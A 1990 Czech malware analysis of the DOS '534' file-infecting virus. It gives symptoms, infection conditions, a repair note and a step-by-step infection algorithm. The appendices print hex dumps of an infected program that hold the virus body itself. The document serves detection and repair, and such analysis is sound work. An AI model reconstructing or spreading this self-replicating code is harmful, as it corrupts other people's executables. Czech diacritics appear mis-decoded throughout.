[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
[[                                                                          ]]
[[                               VIR  534                                   ]]
[[                                                                          ]]
[[  5.5.1990               Nov‚ Mesto nad V hom       Ing.Vladim¡r Matˆjka  ]]
[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]



Charakteristika v¡ru:
---------------------
    V¡r 534 je ozna‡en podle d‚lky o kterou zvˆt¨uje p–vodn¡ d‚lku
souboru. Velmi rychle se roz¨i©uje v souborech typu  *.COM, zejm‚na
pomoc¡ syst‚mov‚ho souboru COMMAND.COM. ’ dn  dal¨¡ manipula‡n¡
‡innost nebyla rozborem prok z na.


Roz¨¡©en¡ v¡ru na souboru typu:  
-------------------------------
- soubory typu  *.COM;
- napad  i soubory s nastaven˜m atributem H (skryt˜) nebo RO (pouze ke ‡ten¡)
- napad  COMMAND.COM.


P©¡znaky p©¡tomnosti v¡ru v souboru:
------------------------------------
- d‚lka souboru je zvˆt¨ena + 534 byte;
- datum vytvo©en¡ souboru je nastaven na 13. mˆs¡c;
- zru¨en p–vodnˆ nastaven˜ atribut souboru RO;
- p©i zalepen‚ disketˆ hl ¨en¡ " Write protect error writing drive A
                                 Abort, Retry, Fail? ".


Podm¡nky aktivizace v¡ru:
-------------------------             
    V‘dy p©i startu infikovan‚ho programu dojde k roz¨¡©en¡ v¡ru 534
na dal¨¡ soubor za tˆchto podm¡nek:
- minim lnˆ verze DOS 2.00;
- soubor mus¡ b˜t typu  *.COM;
- soubor nesm¡ m¡t nastaven atribut S (systemov˜);
- soubor mus¡ b˜t v podadres ©i z kter‚ho byl vol n infikonan˜ soubor,
  nebo v hlavn¡m adres ©i;
- soubor nesm¡ obsahovat p©¡znak v¡ru - 13.mˆs¡c;
- soubor mus¡ m¡t min. d‚lku 256 byte a nesm¡ b˜t vˆt¨¡ jak 64000 byte.

Manipula‡n¡ ‡innost v¡ru:
-------------------------
    V¡r 534 se pouze velmi rychle roz¨i©uje, nevykonav  ‘ dnou dal¨¡ 
ni‡ivou ‡innost. 
    U infikovan‚ho souboru m–‘eme ve sv‚m d–sledku zaznamenat:
- pouze zru¨en˜ atribut RO;
- p©¡znak v¡ru - nastaven 13.mˆs¡c;
- p©ipojen˜ mrtv˜ v¡r (nen¡ adresa skoku na v¡r);
- n kazu aktivn¡m v¡rem.

Opravitelnost infikovan‚ho programu:
------------------------------------
    V¡r 534 p©ep¡¨e prvn¡ 3 byte v infikovan‚m programu, tyto odlo‘¡ do
sv‚ho z pisn¡ku. Oprava infikovan‚ho programu je tedy mo‘n .


[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
[[                                                                          ]]
[[                               VIR  534                                   ]]
[[     5.5.1990                                     Ing.Vladim¡r Matˆjka    ]]
[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]


     Pro rozbor ‡innosti v¡ru 534 a zji¨tˆn¡ jeho ni‡iv˜ch £‡ink– byl zvolen
n sledn˜ postup, kter˜ je v p©¡loh ch zdokumentov n.
     Odchycen¡ vzorku v¡ru 534 bylo proveden‚ na jednoduch‚m programu T.COM,
kter˜ m  za £kol pouze vytisknout znaky '*' na obrazovce.
     Rozbor a zdokumentov n¡ v¡ru je proveden‚ na osobn¡m po‡¡ta‡i PP 06 pod
opera‡n¡m syst‚mem MS DOS 3.30.


a/ V˜pis obsahu p©ipraven‚ diskety pro rozbor v¡ru.
   ------------------------------------------------

     V prvn¡ ‡ sti se zamˆ©¡me na p©¡znaky p©¡tomnosti v¡ru 534 v souborech.
Jako z kladn¡ prost©edek byl zvolen roz¨¡©en˜ PCTOOLS 4.20. V p©¡loze
PCTOOLS/1 je uveden tento v˜pis obsahu diskety:

T        COM     4110   1-01-80  12:59a
T534     COM     4644  13-01-80  12:59a

    Program T.COM je p–vodn¡, dobr˜ program. Program T534.COM je naka‘en v¡rem
534. Z uveden‚ho v˜pisu je na prvn¡ pohled vidˆt tyto zmˆny:
- zmˆna d‚lky    4644 - 4110 = + 534 byte;
- zmˆna v datumu - 13.mˆs¡c !!!! (p©¡znak v¡ru).


b/ Kontrola obsahu adresa©e diskety.
   ---------------------------------

     Na z kladˆ bodu a/ provedeme kontrolu adres ©e diskety s d–razem na rozbor
datumu vytvo©en¡ souboru, v˜pis v p©¡loze  PCTOOLS/2.

- dobr˜ program T.COM 
  -------------------
 0000(0000)  54 20 20 20 20 20 20 20 43 4F 4D 20 00 00 00 00   T       COM  
 0016(0010)  00 00 00 00 00 00 65 07|21 00|02 00 0E 10 00 00 
                            datum ->|-----|

 0021 = 0000 0000 0010 0001
        |------||---||----|--- den    1.
               |    |--------- mˆs¡c  1.
               |-------------- rok   00 = 1980


- program T534.COM naka‘en v¡rem 534
  ----------------------------------
 0032(0020)  54 35 33 34 20 20 20 20 43 4F 4D 20 00 00 00 00   T534    COM  
 0048(0030)  00 00 00 00 00 00 65 07|A1 01|07 00 24 12 00 00
                            datum ->|-----|
 01A1 = 0000 0001 1010 0001
        |------||---||----|--- den    1.
               |    |--------- mˆs¡c 13.    -  p©¡znak v¡ru 534
               |-------------- rok   00 = 1980


c/ Popis funkce programu T.COM.
   ---------------------------

    V p©¡loze PCTOOLS/3,4 je uveden v˜pis prvn¡ho a posledn¡ho sektoru programu
T.COM. Pro dal¨¡ rozbor je pot©ebn‚ si v¨imnout hodnot prvn¡ch 3 byte (0E1FBA).
    V¨echny d le neuveden‚ sektory tohoto programu obsahuj¡ pouze znaky '*'. 
Program kon‡¡ k¢dem 24H.
    Pro £pnost uv d¡m v˜pis funkce programu T.COM odpov¡daj¡c¡ uveden˜m
p©¡loh m.


Path=A:\*.*  
File=T.COM          Relative sector 0000000, Clust 00002, Disk Abs Sec 0000012

Displacement ----------------- Hex codes--------------------     ASCII value
 0000(0000)  0E 1F BA 0D 01 B4 09 CD 21 B4 4C CD 21 2A 2A 2A                ***



AX=0000  BX=0000  CX=1296  DX=0000  SP=FFFE  BP=0000  SI=0000  DI=0000  
DS=156A  ES=156A  SS=156A  CS=156A  IP=0100   NV UP EI PL NZ NA PO NC 

156A:0100 0E             PUSH   CS                              
156A:0101 1F             POP    DS               ;nastavit DS   
156A:0102 BA0D01         MOV    DX,010D          ;ukazatel zacatku textu
156A:0105 B409           MOV    AH,09            ;funkce - tisk textu
156A:0107 CD21           INT    21               ;sluzba DOSu   
156A:0109 BE4C           MOV    AH,4C            ;funkce - ukoncit
156A:010B CD21           INT    21               ;sluzba DOSu
156A:010D 2A2A           DW     '**'             ;zacatek textu
    :
    :                            
156A:110B 2A2A           DW     '**'                            
156A:110D 24             DB     '$'              ;konec textu  



d/ Kontrola programu T534.COM.
   ---------------------------

    V porovn n¡ s programem T.COM vid¡me v p©¡loze PCTOOLS/5,6,7,8 zmˆny, kter‚
provede v¡r p©i n kaze. Na za‡ tku programu T.COM je zmˆna prvn¡ch 3 byte,
p©¡loha PCTOOLS/5. Za konec programu T.COM, p©¡loha PCTOOLS/6, je p©ipojen v¡r
534. Jednoduchou kontrolou zjist¡me, ‘e p–vodn¡ program je del¨¡ o 534 byte.
 

e/ Kontrola naka‘en‚ho programu T534.COM pomoc¡ programu SYMDEB.
   -------------------------------------------------------------

    Pro podrobnˆj¨i rozbor v¡ru 534 je naka‘en˜ program T534.COM zaveden do
pamˆti po‡¡ta‡e PP 06. V p©¡loze SYMDEB/1 je proveden v˜pis programu v pamˆti.
    Nyn¡ ji‘ p©esnˆ vid¡me z kladn¡ zp–sob p©ipojen¡ v¡ru k na¨emu programu.
Na za‡ tku programu T.COM p©epsal v¡r prvn¡ 3 byte instrukc¡ skoku za napaden˜
program, kde je ulo‘en‚ vlastn¡ tˆlo v¡ru, z pisn¡k a DTA.   


f/ Rozbor ‡innosti v¡ru 534.
   -------------------------

     VIR_534 odlo‘il ze za‡ tku programu T.COM prvn¡ 3 byte do sv‚ho z pisn¡ku.
Na toto m¡sto zapsal adresu skoku na vlastn¡ VIR_534, kter˜ p©ipojil na konec
programu T.COM. Po startu infikovan‚ho programu T534.COM v¡r nejd©¡ve provede
opravu prvn¡ch 3 byte programu T.COM. Po realizaci programu v¡ru VIR_534 spust¡
vlastn¡, ji‘ neporu¨en˜ program T.COM.


                  Struktura infikovan‚ho programu T534.COM
                  ----------------------------------------


                  |=======================================|
               |----JMP  VIR_534 |                        |
               |  |--------------|                        |
               |  |                                       |
               |  |                                       |
               |  |       P–vodn¡ dobr˜ program T.COM     |
               |  |                                       |
               |  |                                       |
               |  |=======================================|==|
               |--->                                      |  |
                  |                                       |  |
                  |               VIR_534                 |  |
                  |                                       |+534 byte
                  |                                       |  |
                  |---------------------------------------|  |
                  |          Zapisn¡k VIRu_534            |  |
                  |             DTA VIRu_534              |  |
                  |=======================================|==|



                     Hlavn¡ algoritmus ‡innosti v¡ru 534.
                     ------------------------------------  

    Komentovan˜ popis programu v¡ru 534 je uveden v p©¡loze SYMDEB/2.


    - Obnovit p–vodn¡ program T.COM - vr tit 3 byte na za‡ tek.
Oprava se provad¡ p©esunem p–vodn¡ch 3 byte ze z pisn¡ku na za‡ tek napaden‚ho
programu CS:0100, nyn¡ je zde instrukce pro skok na za‡ tek VIRu_534.

    - Zjistit verzi DOSu - pro ni‘¨¡ verzi jak 2.0 - skok na p–vodn¡ T.COM.

    - Nastavit novou adresu DTA pro p©enosy z disku do z pisn¡ku v¡ru.

    - Vyhledat po‘adovan˜ soubor  *.COM.
Program vyhled  prvn¡ soubor odpovidaj¡c¡ specifikaci (????????.COM00)
s atributem souboru mimo S (systemov˜). Po vyhledan¡ se napn¡ aktu ln¡ oblast 
DTA. Pokud nen¡ soubor *.COM nalezen v aktu ln¡m podadres ©i, je nastavena
cesta do hlavn¡ho adres ©e.

    - Kontrola datumu a d‚lky vyhledan‚ho souboru  *.COM.
Pokud je v datumu vytvo©en¡ souboru nastaven 13.mˆs¡c !!! - p©¡znak v¡ru,
vyhled  se dal¨¡ soubor v adres ©i. Pokud d‚lka vyhledan‚ho souboru je men¨¡
256 byte nebo je rovna, vˆt¨i 64000 byte, vyhled  se dal¨¡ soubor v adres ©i.
P©esun specifikace a parametr– vyhledan‚ho souboru z DTA do zapisn¡ku v¡ru.

    - Zjistit atributy souboru - zru¨it atribut RO.

    - Otev©¡t soubor pro ‡ten¡ a z pis.

    - Zjistit ‡as a datum vytvo©en¡ souboru, ulo‘it do z pisn¡ku.

    - Na‡¡st ze za‡ tku souboru prvn¡ 3 byte, ulo‘it do z pisn¡ku.

    - Nastavit smˆrn¡k na konec souboru, v˜po‡et offset adresy skoku na v¡r.
Adresa skoku se vypo‡¡t  z d‚lky programu T.COM - 3 byte (JMP offset VIR_534).

    - Z pis VIRu_534 na konec souboru - mrtv˜ v¡r.

    - Nastavit smˆrn¡k na za‡ tek souboru.

    - Z pis offset adresy skoku na VIR_534 na za‡ tek souboru - prog. naka‘en.

    - Vr tit p–vodn¡ ‡as vytvo©en¡ souboru.
      Nastavit priznak viru - 13.mesic !!!!
Ze z pisn¡ku VIRu_534 jsou vybr ny p–vodn¡ hodnoty ‡asu a datumu vytvo©en¡
souboru, kter˜ byl infikov n. €as je vr cen v p–vodn¡ hodnotˆ. Hodnota
datumu je zmˆnˆna na 13.mˆs¡c, den a rok z–stavaj¡ bez zmˆny.

    - Uzav©¡t soubor.

    - Nastavit adresu DTA pro p©enosy z disku - offset 80H v PSP.

    - Ukon‡en¡ ‡innosti VIRu_534 - start p–vodn¡ho programu T.COM.



Seznam a stru‡n  charakteristika p©¡loh:
----------------------------------------



PCTOOLS/1  - V˜pis adresa©e diskety.
           Obsahuje program: T.COM,    d‚lky 4110 byte, dobr˜ program.
           Obsahuje program: T534.COM, d‚lky 4644 byte, infik. prog. 13.mes¡c.

PCTOOLS/2  - V˜pis adres ©e diskety - ROOT sektor.
           Obsahuje program: T.COM, dobr˜ program.
           Obsahuje program: T534.COM, infikovan˜ program, 13.mesic.

PCTOOLS/3  - V˜pis dobr‚ho programu T.COM - prvn¡ rel. sektor.

PCTOOLS/4  - V˜pis dobr‚ho programu T.COM - posledn¡ rel. sektor.

PCTOOLS/5  - V˜pis infikovan‚ho programu T534.COM - prvn¡ rel. sektror.
           Obsahuje dobr˜ program T.COM, kde prvn¡ 3 byte jsou
           p©eps ny instrukci skoku na VIR_534.

PCTOOLS/6  - V˜pis infikovan‚ho programu T534.COM - 8. rel. sektor.
           Obsahuje ©adn‚ ukon‡en¡ programu T.COM a za‡ tek prog. VIR_534.

PCTOOLS/7  - V˜pis infikovan‚ho programu T534.COM - 8. rel. sektor.
           Obsahuje ukon‡en¡ programu V‹Ru_534, jeho z pisn¡k a DTA.

PCTOOLS/8  - V˜pis infikovan‚ho programu T534.COM - 9. rel. sektor.
           Obsahuje konec programu VIRu_534.



SYMDEB/1  - V˜pis infikovan‚ho programu T534.COM.
          Obsahuje dobr˜ program T.COM, sch‚maticky p©eru¨en s adresou
          skoku na VIR_534. V dal¨¡m je vypis programu vlastn¡ho VIRu_534
          s jeho z pisn¡kem a DTA.

SYMDEB/2  - V˜pis infikovan‚ho programu T534.COM.
          Obsahuje rozbor ‡innosti programu VIRu_534 s popisem jeho
          manipula‡n¡ ‡innosti.

                                                             Priloha: PCTOOLS/1
                                                             ------------------
PC Tools Deluxe R4.20                                      Vol Label=None       
---------------------------------File Functions------------------Scroll Lock OFF
Path=A:\*.*  
    Name     Ext     Size #Clu   Date    Time  Attributes                       
    T        COM     4110    5  1/01/80 12:59a Normal,Archive                   
    T534     COM     4644    5 13/01/80 12:59a Normal,Archive                   
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
|------------------------------------------------------------------------------|
|   2 files LISTed   =     8754 bytes.    2 files in sub-dir =     8754 bytes. |
|   0 files SELECTed =        0 bytes.   Available on volume =   352256 bytes. |
|------------------------------------------------------------------------------|
|   Copy Move cOmp Find Rename Delete Ver view/Edit Attrib Wordp Print List    |
|Sort Help =SELECT F1=UNselect F2=alt dir lst F3=other menu Esc=exit PC Tools  |
|  F8=directory LIST argument  F9=file SELECTion argument  F10=chg drive/path  |
|------------------------------------------------------------------------------|



                                                             Priloha: PCTOOLS/2
                                                             ------------------
PC Tools Deluxe R4.20                                                           
------------------------------Disk View/Edit Service----------------------------
Path=A:                                                                         
                    Absolute sector 0000005, System ROOT                        
                                                                                
Displacement ----------------- Hex codes--------------------     ASCII value    
 0000(0000)  54 20 20 20 20 20 20 20 43 4F 4D 20 00 00 00 00   T       COM  
 0016(0010)  00 00 00 00 00 00 65 07 21 00 02 00 0E 10 00 00 
 0032(0020)  54 35 33 34 20 20 20 20 43 4F 4D 20 00 00 00 00   T534    COM  
 0048(0030)  00 00 00 00 00 00 65 07 A1 01 07 00 24 12 00 00
 0064(0040)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0080(0050)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0096(0060)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0112(0070)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0128(0080)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0144(0090)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0160(00A0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0176(00B0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0192(00C0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0208(00D0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0224(00E0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0240(00F0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
                                                                                
 Home=beg of file/disk  End=end of file/disk                                    
 ESC=Exit  PgDn=forward  PgUp=back  F2=chg sector num  F3=edit  F4=get name     


                                                             Priloha: PCTOOLS/3
                                                             ------------------
PC Tools Deluxe R4.20                                      Vol Label=None       
------------------------------File View/Edit Service----------------------------
Path=A:\*.*  
File=T.COM          Relative sector 0000000, Clust 00002, Disk Abs Sec 0000012  
                                                                                
Displacement ----------------- Hex codes--------------------     ASCII value    
 0000(0000)  0E 1F BA 0D 01 B4 09 CD 21 B4 4C CD 21 2A 2A 2A                ***
 0016(0010)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0032(0020)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0048(0030)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0064(0040)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0080(0050)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0096(0060)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0112(0070)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0128(0080)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0144(0090)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0160(00A0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0176(00B0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0192(00C0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0208(00D0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0224(00E0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0240(00F0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
                                                                                
 Home=beg of file/disk  End=end of file/disk                                    
 ESC=Exit  PgDn=forward  PgUp=back  F1=toggle mode  F2=chg sector num  F3=edit  



                                                             Priloha: PCTOOLS/4
                                                             ------------------
PC Tools Deluxe R4.20                                      Vol Label=None       
------------------------------File View/Edit Service----------------------------
Path=A:\*.*  
File=T.COM          Relative sector 0000008, Clust 00006, Disk Abs Sec 0000020  
                                                                                
Displacement ----------------- Hex codes--------------------     ASCII value    
 0000(0000)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 24 00 00   *************$ 
 0016(0010)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0032(0020)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0048(0030)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0064(0040)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0080(0050)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0096(0060)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0112(0070)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0128(0080)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0144(0090)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0160(00A0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0176(00B0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0192(00C0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0208(00D0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0224(00E0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0240(00F0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
                                                                                
 Home=beg of file/disk  End=end of file/disk                                    
 ESC=Exit  PgDn=forward  PgUp=back  F1=toggle mode  F2=chg sector num  F3=edit  


                                                             Priloha: PCTOOLS/5
                                                             ------------------
PC Tools Deluxe R4.20                                      Vol Label=None       
------------------------------File View/Edit Service----------------------------
Path=A:\*.*  
File=T534.COM       Relative sector 0000000, Clust 00007, Disk Abs Sec 0000022  

Displacement ----------------- Hex codes--------------------     ASCII value    
 0000(0000)  E9 0B 10 0D 01 B4 09 CD 21 B4 4C CD 21 2A 2A 2A                ***
 0016(0010)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0032(0020)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0048(0030)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0064(0040)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0080(0050)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0096(0060)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0112(0070)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0128(0080)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0144(0090)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0160(00A0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0176(00B0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0192(00C0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0208(00D0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0224(00E0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
 0240(00F0)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A   **************** 
                                                                                
 Home=beg of file/disk  End=end of file/disk                                    
 ESC=Exit  PgDn=forward  PgUp=back  F1=toggle mode  F2=chg sector num  F3=edit  



                                                             Priloha: PCTOOLS/6
                                                             ------------------
PC Tools Deluxe R4.20                                      Vol Label=None       
------------------------------File View/Edit Service----------------------------
Path=A:\*.*  
File=T534.COM       Relative sector 0000008, Clust 00011, Disk Abs Sec 0000030  

Displacement ----------------- Hex codes--------------------     ASCII value    
 0000(0000)  2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 2A 24 50 BE   *************$
 0016(0010)  73 12 8B D6 81 C6 00 00 FC B9 03 00 BF 00 01 F3
 0032(0020)  A4 8B FA B4 30 CD 21 3C 00 75 03 E9 3F 01 BA 2C
 0048(0030)  00 03 D7 8B DA B4 1A CD 21 BD 00 00 8B D7 81 C2
 0064(0040)  07 00 B9 03 00 B4 4E CD 21 E9 04 00 B4 4F CD 21
 0080(0050)  73 15 3C 12 74 03 E9 0D 01 83 FD FF 75 03 E9 05
 0096(0060)  01 4A BD FF FF EB DB 8B 4F 18 81 E1 E0 01 81 F9
 0112(0070)  A0 01 74 D8 81 7F 1A 00 FA 77 D1 81 7F 1A 00 01
 0128(0080)  72 CA 57 8B F3 83 C6 1E 81 C7 14 00 83 FD FF 75
 0144(0090)  03 B0 5C AA AC AA 3C 00 75 FA 5F 8B D7 81 C2 14
 0160(00A0)  00 B8 00 43 CD 21 89 8D 22 00 81 E1 FE FF 8B D7
 0176(00B0)  81 C2 14 00 B8 01 43 CD 21 8B D7 81 C2 14 00 B8
 0192(00C0)  02 3D CD 21 73 03 E9 94 00 8B D8 B8 00 57 CD 21
 0208(00D0)  89 8D 24 00 89 95 26 00 B4 3F B9 03 00 8B D7 81
 0224(00E0)  C2 00 00 CD 21 73 03 E9 5A 00 3D 03 00 75 55 B8
 0240(00F0)  02 42 B9 00 00 8B D1 CD 21 2D 03 00 89 85 04 00

 Home=beg of file/disk  End=end of file/disk                                    
 ESC=Exit  PgDn=forward  PgUp=back  F1=toggle mode  F2=chg sector num  F3=edit  


                                                             Priloha: PCTOOLS/7
                                                             ------------------
PC Tools Deluxe R4.20                                      Vol Label=None       
------------------------------File View/Edit Service----------------------------
Path=A:\*.*  
File=T534.COM       Relative sector 0000008, Clust 00011, Disk Abs Sec 0000030  

Displacement ----------------- Hex codes--------------------     ASCII value    
 0256(0100)  B9 65 01 83 FA 00 75 3C 8B D7 2B F9 83 C7 02 05
 0272(0110)  03 01 03 C1 89 05 B4 40 8B FA 2B D1 B9 16 02 CD
 0288(0120)  21 73 03 E9 1E 00 3D 16 02 75 19 B8 00 42 B9 00
 0304(0130)  00 8B D1 CD 21 72 0D B4 40 B9 03 00 8B D7 81 C2
 0320(0140)  03 00 CD 21 8B 8D 24 00 8B 95 26 00 81 E2 1F FE
 0336(0150)  81 CA A0 01 B8 01 57 CD 21 B4 3E CD 21 B8 00 43
 0352(0160)  8B 8D 22 00 CD 21 BA 80 00 B4 1A CD 21 58 BF 00
 0368(0170)  01 57 C3 0E 1F BA E9 0B 10 5C 3F 3F 3F 3F 3F 3F             ??????
 0384(0180)  3F 3F 2E 43 4F 4D 00 54 2E 43 4F 4D 00 2E 43 4F   ??.COM T.COM  CO 
 0400(0190)  4D 00 4D 00 00 20 00 65 07 21 00 00 00 00 00 01   M M
 0416(01A0)  3F 3F 3F 3F 3F 3F 3F 3F 43 4F 4D 03 04 00 00 00   ????????COM
 0432(01B0)  00 00 00 00 20 65 07 21 00 0E 10 00 00 54 2E 43                T.C
 0448(01C0)  4F 4D 00 20 20 4F 4D 00 00 00 6F 73 6F 66 74 79   OM  O    Mosofty 
 0464(01D0)  72 69 67 68 74 20 4D 69 63 72 6F 73 6F 66 74 79   right Microsofty 
 0480(01E0)  72 69 67 68 74 20 4D 69 63 72 6F 73 6F 66 74 79   right Microsofty 
 0496(01F0)  72 69 67 68 74 20 4D 69 63 72 6F 73 6F 66 74 79   right Microsofty 
                                                                                
 Home=beg of file/disk  End=end of file/disk                                    
 ESC=Exit  PgDn=forward  PgUp=back  F1=toggle mode  F2=chg sector num  F3=edit  


                                                                                

                                                             Priloha: PCTOOLS/8
                                                             ------------------
PC Tools Deluxe R4.20                                      Vol Label=None       
------------------------------File View/Edit Service----------------------------
Path=A:\*.*  
File=T534.COM       Relative sector 0000009, Clust 00011, Disk Abs Sec 0000031  

Displacement ----------------- Hex codes--------------------     ASCII value    
 0000(0000)  72 69 67 68 74 20 4D 69 63 72 6F 73 6F 66 74 79   right Microsofty 
 0016(0010)  72 69 67 68 74 20 4D 69 63 72 6F 73 6F 66 74 20   right Microsoft  
 0032(0020)  31 39 38 38 00 00 00 00 00 00 00 00 00 00 00 00   1988 
 0048(0030)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0064(0040)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0080(0050)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0096(0060)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0112(0070)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0128(0080)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0144(0090)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0160(00A0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0176(00B0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0192(00C0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0208(00D0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0224(00E0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
 0240(00F0)  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    
                                                                                
 Home=beg of file/disk  End=end of file/disk                                    
 ESC=Exit  PgDn=forward  PgUp=back  F1=toggle mode  F2=chg sector num  F3=edit  

                                                              Priloha: SYMDEB/1
                                                              -----------------

AX=0000  BX=0000  CX=1224  DX=0000  SP=FFFE  BP=0000  SI=0000  DI=0000  
DS=156A  ES=156A  SS=156A  CS=156A  IP=0100   NV UP EI PL NZ NA PO NC 
156A:0100 E90B10         JMP	110E ----------------\             
                                                    \
156A:0103           0D 01 B4 09 CD-21 B4 4C CD 21 2A|2A 2A  i....4.M!4LM!***
156A:0110  2A 2A 2A 2A 2A 2A 2A 2A-2A 2A 2A 2A 2A 2A|2A 2A  ****************
    :                                                \
    :                     konec programu  T.COM -->| |<-- zacatek VIRu_534
156A:1100  2A 2A 2A 2A 2A 2A 2A 2A-2A 2A 2A 2A 2A 24 51 BA  *************$Q:
---------------------------------------------------| 
156A:1110  73 12 8B D6 81 C6 00 00-FC B9 03 00 BF 00 01 F3  s..V.F..|9..?..s
156A:1120  A4 8B FA B4 30 CD 21 3C-00 75 03 E9 3F 01 BA 2C  $.z40M!<.u.i?.:,
